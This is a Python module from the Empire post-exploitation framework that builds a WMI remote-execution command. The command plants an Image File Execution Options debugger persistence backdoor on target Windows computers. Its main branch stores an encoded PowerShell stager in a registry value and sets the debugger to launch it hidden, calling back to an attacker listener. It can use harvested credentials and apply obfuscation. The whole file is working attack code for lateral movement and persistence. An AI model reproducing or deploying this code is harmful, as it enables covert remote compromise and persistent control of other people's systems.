from empire.server.common import helpers
from empire.server.common.empire import MainMenu
from empire.server.core.db.base import SessionLocal
from empire.server.core.exceptions import ModuleValidationException
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        script = """$null = Invoke-WmiMethod -Path Win32_process -Name create"""

        # staging options
        cleanup = params["Cleanup"]
        binary = params["Binary"]
        target_binary = params["TargetBinary"]
        listener_name = params["Listener"]
        launcher_obfuscate = params["Obfuscate"].lower() == "true"
        launcher_obfuscate_command = params["ObfuscateCommand"]

        # storage options
        reg_path = params["RegPath"]

        status_msg = ""
        location_string = ""

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":
            with SessionLocal() as db:
                cred = main_menu.credentialsv2.get_by_id(db, cred_id)

                if not cred:
                    raise ModuleValidationException("CredID is invalid!")

                if cred.domain != "":
                    params["UserName"] = str(cred.domain) + "\\" + str(cred.username)
                else:
                    params["UserName"] = str(cred.username)
                if cred.password != "":
                    params["Password"] = cred.password

        if cleanup.lower() == "true":
            # the registry command to disable the debugger for the target binary
            payload_code = (
                "Remove-Item 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
                + target_binary
                + "';"
            )
            status_msg += " to remove the debugger for " + target_binary

        elif listener_name != "":
            # if there's a listener specified, generate a stager and store it
            if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
                # not a valid listener, return nothing for the script
                raise ModuleValidationException(
                    "[!] Invalid listener: " + listener_name
                )

            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language="powershell",
                encode=True,
                obfuscate=launcher_obfuscate,
                obfuscation_command=launcher_obfuscate_command,
                bypasses=params["Bypasses"],
            )

            encScript = launcher.split(" ")[-1]
            # statusMsg += "using listener " + listenerName

            path = "\\".join(reg_path.split("\\")[0:-1])
            name = reg_path.split("\\")[-1]

            # statusMsg += " stored in " + regPath + "."

            payload_code = "$RegPath = '" + reg_path + "';"
            payload_code += "$parts = $RegPath.split('\\');"
            payload_code += (
                "$path = $RegPath.split(\"\\\")[0..($parts.count -2)] -join '\\';"
            )
            payload_code += "$name = $parts[-1];"
            payload_code += (
                "$null=Set-ItemProperty -Force -Path $path -Name $name -Value "
                + encScript
                + ";"
            )

            # note where the script is stored
            location_string = "$((gp " + path + " " + name + ")." + name + ")"

            payload_code += (
                "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
                + target_binary
                + "';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
                + target_binary
                + '\' -Name Debugger -Value \'"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -c "$x='
                + location_string
                + ';start -Win Hidden -A \\"-enc $x\\" powershell";exit;\';'
            )

            status_msg += (
                " to set the debugger for "
                + target_binary
                + " to be a stager for listener "
                + listener_name
                + "."
            )

        else:
            payload_code = (
                "$null=New-Item -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
                + target_binary
                + "';$null=Set-ItemProperty -Force -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
                + target_binary
                + "' -Name Debugger -Value '"
                + binary
                + "';"
            )

            status_msg += (
                " to set the debugger for " + target_binary + " to be " + binary + "."
            )

        # unicode-base64 the payload code to execute on the targets with -enc
        encPayload = helpers.enc_powershell(payload_code)

        # build the WMI execution string
        computer_names = '"' + '","'.join(params["ComputerName"].split(",")) + '"'

        script += " -ComputerName @(" + computer_names + ")"
        script += (
            ' -ArgumentList "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\powershell.exe -enc '
            + encPayload.decode("UTF-8")
            + '"'
        )

        # if we're supplying alternate user credentials
        if params["UserName"] != "":
            script = (
                '$PSPassword = "'
                + params["Password"]
                + '" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential("'
                + params["UserName"]
                + '",$PSPassword);'
                + script
                + " -Credential $Credential"
            )

        script += ";'Invoke-Wmi executed on " + computer_names + status_msg + "'"

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
